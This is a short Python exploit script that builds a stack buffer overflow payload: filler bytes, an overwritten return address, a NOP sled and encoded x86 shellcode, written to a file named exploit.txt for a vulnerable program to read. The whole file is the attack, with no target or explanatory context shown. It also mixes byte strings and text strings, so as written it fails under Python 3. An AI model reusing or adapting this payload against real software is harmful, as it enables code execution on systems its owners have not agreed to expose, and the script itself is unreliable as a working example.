#!/usr/bin/python3

buffer = b"\x41" * 98
eip = b"\x5e\x51\x9a\x5e"

nops = b"\x90" * 32

shellcode = (
"\xd9\xf6\xd9\x74\x24\xf4\x5b\xb8\x04\x1b\xb7\x61\x2b\xc9\xb1"
"\x12\x83\xc3\x04\x31\x43\x13\x03\x47\x08\x55\x94\x76\xf5\x6e"
"\xb4\x2b\x4a\xc2\x51\xc9\xc5\x05\x15\xab\x18\x45\xc5\x6a\x13"
"\x79\x27\x0c\x1a\xff\x4e\x64\x5d\x57\xc7\xe1\x35\xaa\x28\x08"
"\x7d\x23\xc9\xba\xe7\x64\x5b\xe9\x54\x87\xd2\xec\x56\x08\xb6"
"\x86\x06\x26\x44\x3e\xbf\x17\x85\xdc\x56\xe1\x3a\x72\xfa\x78"
"\x5d\xc2\xf7\xb7\x1e")


inputBuffer = buffer + eip + nops + shellcode + '\n'


f = open("exploit.txt", "wb")
f.write(inputBuffer)
f.close()